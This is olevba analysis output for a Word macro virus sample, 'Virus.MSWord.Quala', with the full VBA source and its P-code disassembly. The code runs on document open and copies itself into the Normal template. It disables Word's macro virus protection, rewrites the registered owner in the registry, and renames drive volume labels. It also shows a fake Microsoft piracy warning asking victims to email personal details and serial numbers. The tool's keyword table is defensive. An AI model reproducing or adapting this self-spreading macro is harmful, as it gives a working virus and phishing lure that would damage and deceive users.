olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Quala
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Quala - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO QuakeLab.bas 
in file: Virus.MSWord.Quala - OLE stream: 'Macros/VBA/QuakeLab'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Declare Function SetVolumeLabel Lib "kernel32" Alias "SetVolumeLabelA" (ByVal lpRootPathName As String, ByVal lpVolumeName As String) As Long
Public Function SetLabel(RootName As String, NewLabel As String)
If RootName = "" Then
Exit Function
End If
Call SetVolumeLabel(RootName, NewLabel)
End Function
Sub ToolsMacro()
On Error GoTo Error
Formact
Error:
End Sub
Sub AutoOpen()
On Error Resume Next
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
  CommandBars("Macro").Controls("Security...").Enabled = False
  System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
  Else
  CommandBars("Tools").Controls("Macro").Enabled = True
  Options.ConfirmConversions = (1 - 1): Options.VirusProtection = (1 - 1): Options.SaveNormalPrompt = (1 - 1)
End If
Options.SaveNormalPrompt = False
 Application.Options.VirusProtection = False
Application.Options.ConfirmConversions = False
Application.ActiveDocument.AcceptAllRevision
Call Normat
End Sub
Sub ViewVBCode()
Call Formact
End Sub
Sub Normat()
On Error Resume Next
ModulName = "QuakeLab"
FileName = "~chk00001.tmp"
If MacroContainer = NormalTemplate Then
  Set Carrier = NormalTemplate.VBProject.VBComponents
  Set host = ActiveDocument.VBProject.VBComponents
Else
  Set Carrier = ActiveDocument.VBProject.VBComponents
  Set host = NormalTemplate.VBProject.VBComponents
End If
s1 = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "SystemRoot")
If host(ModulName).Name <> ModulName Then
  Carrier(ModulName).Export "c:\~chk00001.tmp"
  host.Import ("c:\~chk00001.tmp")
Kill ("c:\~chk00001.tmp")
End If
If ActiveDocument.Content.Characters.Count = 0 Then ActiveDocument.Saved = True Else ActiveDocument.save
End Sub
Sub ViewCode()
k = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "Version")
Output = " No way..!  Please obtain Original version of " & k
MsgBox (Output), 16, "Warning !"
End Sub
Sub Formact()
e = Month(Now)
k = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "Version")
Output = "The " & k & " version Installed in your computer seems to be a pirated copy. Microsoft has the rights to take action against using illegal copies of it's product. Some of the options are disabled in your computer.To enable these option, E.mail the the Name and Address of the Registered owner with E.mail address & Serial number to win_op_sys@hotmail.com . You will be exempted from punishment.                                                                                                                                                                                                                           -Microsoft Corporation"
MsgBox (Output), 48, "Warning !"
If e > "8" Then
Call SetLabel("c:\", "AnthraxC")
Call SetLabel("d:\", "AnthraxD")
Call SetLabel("e:\", "AnthraxE")
Call SetLabel("f:\", "AnthraxF")
Call SetLabel("g:\", "AnthraxG")
Call SetLabel("h:\", "AnthraxH")
Else
End If
End Sub
Sub FileSave()
On Error GoTo EFR
If System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "RegisteredOwner") = "Dr.Anthrax" Then
Else
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "RegisteredOwner") = "Dr.Anthrax"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "RegisteredOrganization") = "Quake Labs"
End If
ActiveDocument.save
EFR:
End Sub
Sub InsertPageNumbers()
    If ActiveWindow.View.SplitSpecial <> wdPaneNone Then
        ActiveWindow.Panes(2).Close
    End If
    If ActiveWindow.ActivePane.View.Type = wdNormalView Or ActiveWindow. _
        ActivePane.View.Type = wdOutlineView Or ActiveWindow.ActivePane.View.Type _
         = wdMasterView Then
        ActiveWindow.ActivePane.View.Type = wdPageView
    End If
    ActiveWindow.ActivePane.View.SeekView = wdSeekCurrentPageHeader
    If Selection.HeaderFooter.IsHeader = True Then
        ActiveWindow.ActivePane.View.SeekView = wdSeekCurrentPageFooter
    Else
        ActiveWindow.ActivePane.View.SeekView = wdSeekCurrentPageHeader
    End If
    Selection.WholeStory
    Selection.Delete Unit:=wdCharacter, Count:=1
    Selection.ParagraphFormat.Alignment = wdAlignParagraphRight
    Selection.TypeText Text:="Quake Labs"
    Selection.HomeKey Unit:=wdLine
    Selection.Fields.Add Range:=Selection.Range, Type:=wdFieldPage
    Selection.TypeText Text:=" "
    ActiveWindow.ActivePane.View.SeekView = wdSeekMainDocument
End Sub






-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Quala
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1120 bytes
' Macros/VBA/QuakeLab - 8168 bytes
' Line #0:
' 	FuncDefn (Declare Function SetVolumeLabel Lib "kernel32" (ByVal lpRootPathName As String, ByVal lpVolumeName As String) As Long)
' Line #1:
' 	FuncDefn (Public Function SetLabel(RootName As String, NewLabel As String))
' Line #2:
' 	Ld RootName 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #3:
' 	ExitFunc 
' Line #4:
' 	EndIfBlock 
' Line #5:
' 	Ld RootName 
' 	Ld NewLabel 
' 	ArgsCall (Call) SetVolumeLabel 0x0002 
' Line #6:
' 	EndFunc 
' Line #7:
' 	FuncDefn (Sub ToolsMacro())
' Line #8:
' 	OnError Error 
' Line #9:
' 	ArgsCall Formact 0x0000 
' Line #10:
' 	Label Error 
' Line #11:
' 	EndSub 
' Line #12:
' 	FuncDefn (Sub AutoOpen())
' Line #13:
' 	OnError (Resume Next) 
' Line #14:
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #15:
' 	LitVarSpecial (False)
' 	LitStr 0x000B "Security..."
' 	LitStr 0x0005 "Macro"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #16:
' 	LitDI4 0x0001 0x0000 
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #17:
' 	ElseBlock 
' Line #18:
' 	LitVarSpecial (True)
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #19:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Ld Options 
' 	MemSt ConfirmConversions 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Ld Options 
' 	MemSt VirusProtection 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #20:
' 	EndIfBlock 
' Line #21:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #22:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemLd Options 
' 	MemSt VirusProtection 
' Line #23:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemLd Options 
' 	MemSt ConfirmConversions 
' Line #24:
' 	Ld Application 
' 	MemLd ActiveDocument 
' 	ArgsMemCall AcceptAllRevision 0x0000 
' Line #25:
' 	ArgsCall (Call) Normat 0x0000 
' Line #26:
' 	EndSub 
' Line #27:
' 	FuncDefn (Sub ViewVBCode())
' Line #28:
' 	ArgsCall (Call) Formact 0x0000 
' Line #29:
' 	EndSub 
' Line #30:
' 	FuncDefn (Sub Normat())
' Line #31:
' 	OnError (Resume Next) 
' Line #32:
' 	LitStr 0x0008 "QuakeLab"
' 	St ModulName 
' Line #33:
' 	LitStr 0x000D "~chk00001.tmp"
' 	St FileName 
' Line #34:
' 	Ld MacroContainer 
' 	Ld NormalTemplate 
' 	Eq 
' 	IfBlock 
' Line #35:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set Carrier 
' Line #36:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set host 
' Line #37:
' 	ElseBlock 
' Line #38:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set Carrier 
' Line #39:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set host 
' Line #40:
' 	EndIfBlock 
' Line #41:
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion"
' 	LitStr 0x000A "SystemRoot"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St s1 
' Line #42:
' 	Ld ModulName 
' 	ArgsLd host 0x0001 
' 	MemLd New 
' 	Ld ModulName 
' 	Ne 
' 	IfBlock 
' Line #43:
' 	LitStr 0x0010 "c:\~chk00001.tmp"
' 	Ld ModulName 
' 	ArgsLd Carrier 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #44:
' 	LitStr 0x0010 "c:\~chk00001.tmp"
' 	Paren 
' 	Ld host 
' 	ArgsMemCall Import 0x0001 
' Line #45:
' 	LitStr 0x0010 "c:\~chk00001.tmp"
' 	Paren 
' 	ArgsCall Kill 0x0001 
' Line #46:
' 	EndIfBlock 
' Line #47:
' 	Ld ActiveDocument 
' 	MemLd Content 
' 	MemLd Characters 
' 	MemLd Count 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' 	Else 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall save 0x0000 
' 	EndIf 
' Line #48:
' 	EndSub 
' Line #49:
' 	FuncDefn (Sub ViewCode())
' Line #50:
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion"
' 	LitStr 0x0007 "Version"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St k 
' Line #51:
' 	LitStr 0x002E " No way..!  Please obtain Original version of "
' 	Ld k 
' 	Concat 
' 	St ParamArray 
' Line #52:
' 	Ld ParamArray 
' 	Paren 
' 	LitDI2 0x0010 
' 	LitStr 0x0009 "Warning !"
' 	ArgsCall MsgBox 0x0003 
' Line #53:
' 	EndSub 
' Line #54:
' 	FuncDefn (Sub Formact())
' Line #55:
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	St e 
' Line #56:
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion"
' 	LitStr 0x0007 "Version"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St k 
' Line #57:
' 	LitStr 0x0004 "The "
' 	Ld k 
' 	Concat 
' 	LitStr 0x026E " version Installed in your computer seems to be a pirated copy. Microsoft has the rights to take action against using illegal copies of it's product. Some of the options are disabled in your computer.To enable these option, E.mail the the Name and Address of the Registered owner with E.mail address & Serial number to win_op_sys@hotmail.com . You will be exempted from punishment.                                                                                                                                                                                                                           -Microsoft Corporation"
' 	Concat 
' 	St ParamArray 
' Line #58:
' 	Ld ParamArray 
' 	Paren 
' 	LitDI2 0x0030 
' 	LitStr 0x0009 "Warning !"
' 	ArgsCall MsgBox 0x0003 
' Line #59:
' 	Ld e 
' 	LitStr 0x0001 "8"
' 	Gt 
' 	IfBlock 
' Line #60:
' 	LitStr 0x0003 "c:\"
' 	LitStr 0x0008 "AnthraxC"
' 	ArgsCall (Call) SetLabel 0x0002 
' Line #61:
' 	LitStr 0x0003 "d:\"
' 	LitStr 0x0008 "AnthraxD"
' 	ArgsCall (Call) SetLabel 0x0002 
' Line #62:
' 	LitStr 0x0003 "e:\"
' 	LitStr 0x0008 "AnthraxE"
' 	ArgsCall (Call) SetLabel 0x0002 
' Line #63:
' 	LitStr 0x0003 "f:\"
' 	LitStr 0x0008 "AnthraxF"
' 	ArgsCall (Call) SetLabel 0x0002 
' Line #64:
' 	LitStr 0x0003 "g:\"
' 	LitStr 0x0008 "AnthraxG"
' 	ArgsCall (Call) SetLabel 0x0002 
' Line #65:
' 	LitStr 0x0003 "h:\"
' 	LitStr 0x0008 "AnthraxH"
' 	ArgsCall (Call) SetLabel 0x0002 
' Line #66:
' 	ElseBlock 
' Line #67:
' 	EndIfBlock 
' Line #68:
' 	EndSub 
' Line #69:
' 	FuncDefn (Sub FileSave())
' Line #70:
' 	OnError EFR 
' Line #71:
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion"
' 	LitStr 0x000F "RegisteredOwner"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x000A "Dr.Anthrax"
' 	Eq 
' 	IfBlock 
' Line #72:
' 	ElseBlock 
' Line #73:
' 	LitStr 0x000A "Dr.Anthrax"
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion"
' 	LitStr 0x000F "RegisteredOwner"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #74:
' 	LitStr 0x000A "Quake Labs"
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion"
' 	LitStr 0x0016 "RegisteredOrganization"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #75:
' 	EndIfBlock 
' Line #76:
' 	Ld ActiveDocument 
' 	ArgsMemCall save 0x0000 
' Line #77:
' 	Label EFR 
' Line #78:
' 	EndSub 
' Line #79:
' 	FuncDefn (Sub InsertPageNumbers())
' Line #80:
' 	Ld ActiveWindow 
' 	MemLd View 
' 	MemLd SplitSpecial 
' 	Ld wdPaneNone 
' 	Ne 
' 	IfBlock 
' Line #81:
' 	LitDI2 0x0002 
' 	Ld ActiveWindow 
' 	ArgsMemLd Panes 0x0001 
' 	ArgsMemCall Close 0x0000 
' Line #82:
' 	EndIfBlock 
' Line #83:
' 	LineCont 0x0008 0D 00 08 00 1C 00 09 00
' 	Ld ActiveWindow 
' 	MemLd ActivePane 
' 	MemLd View 
' 	MemLd TypeOf 
' 	Ld wdNormalView 
' 	Eq 
' 	Ld ActiveWindow 
' 	MemLd ActivePane 
' 	MemLd View 
' 	MemLd TypeOf 
' 	Ld wdOutlineView 
' 	Eq 
' 	Or 
' 	Ld ActiveWindow 
' 	MemLd ActivePane 
' 	MemLd View 
' 	MemLd TypeOf 
' 	Ld wdMasterView 
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #84:
' 	Ld wdPageView 
' 	Ld ActiveWindow 
' 	MemLd ActivePane 
' 	MemLd View 
' 	MemSt TypeOf 
' Line #85:
' 	EndIfBlock 
' Line #86:
' 	Ld wdSeekCurrentPageHeader 
' 	Ld ActiveWindow 
' 	MemLd ActivePane 
' 	MemLd View 
' 	MemSt SeekView 
' Line #87:
' 	Ld Selection 
' 	MemLd HeaderFooter 
' 	MemLd IsHeader 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #88:
' 	Ld wdSeekCurrentPageFooter 
' 	Ld ActiveWindow 
' 	MemLd ActivePane 
' 	MemLd View 
' 	MemSt SeekView 
' Line #89:
' 	ElseBlock 
' Line #90:
' 	Ld wdSeekCurrentPageHeader 
' 	Ld ActiveWindow 
' 	MemLd ActivePane 
' 	MemLd View 
' 	MemSt SeekView 
' Line #91:
' 	EndIfBlock 
' Line #92:
' 	Ld Selection 
' 	ArgsMemCall WholeStory 0x0000 
' Line #93:
' 	Ld wdCharacter 
' 	ParamNamed Unit 
' 	LitDI2 0x0001 
' 	ParamNamed Count 
' 	Ld Selection 
' 	ArgsMemCall Delete 0x0002 
' Line #94:
' 	Ld wdAlignParagraphRight 
' 	Ld Selection 
' 	MemLd ParagraphFormat 
' 	MemSt Alignment 
' Line #95:
' 	LitStr 0x000A "Quake Labs"
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #96:
' 	Ld wdLine 
' 	ParamNamed Unit 
' 	Ld Selection 
' 	ArgsMemCall HomeKey 0x0001 
' Line #97:
' 	Ld Selection 
' 	MemLd Range 
' 	ParamNamed Range 
' 	Ld wdFieldPage 
' 	ParamNamed TypeOf 
' 	Ld Selection 
' 	MemLd Fields 
' 	ArgsMemCall Add 0x0002 
' Line #98:
' 	LitStr 0x0001 " "
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #99:
' 	Ld wdSeekMainDocument 
' 	Ld ActiveWindow 
' 	MemLd ActivePane 
' 	MemLd View 
' 	MemSt SeekView 
' Line #100:
' 	EndSub 
' Line #101:
' Line #102:
' Line #103:
' Line #104:
' Line #105:
' Line #106:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

